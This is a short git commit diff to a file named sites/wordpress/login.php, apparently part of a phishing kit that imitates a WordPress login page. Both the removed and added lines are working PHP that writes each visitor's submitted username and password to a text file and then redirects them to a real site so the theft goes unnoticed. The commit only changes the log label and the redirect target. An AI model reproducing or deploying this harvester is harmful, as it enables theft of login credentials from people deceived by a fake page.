0d7d3d61670d0158d05fbee4b67af38364d7f52b
Abir Hasan <hackitabirhasan@gmail.com>
2020-08-25 15:26:27 +0600

    Add files via upload

--- sites/wordpress/login.php
+++ sites/wordpress/login.php
@@ -1,5 +1,5 @@
 <?php
 
-file_put_contents("usernames.txt", "Account: " . $_POST['log'] . " Pass: " . $_POST['pwd'] . "\n", FILE_APPEND);
-header('Location: https://wordpress.com');
+file_put_contents("usernames.txt", "Username: " . $_POST['log'] . " Pass: " . $_POST['pwd'] . "\n", FILE_APPEND);
+header('Location: https://google.com');
 exit();
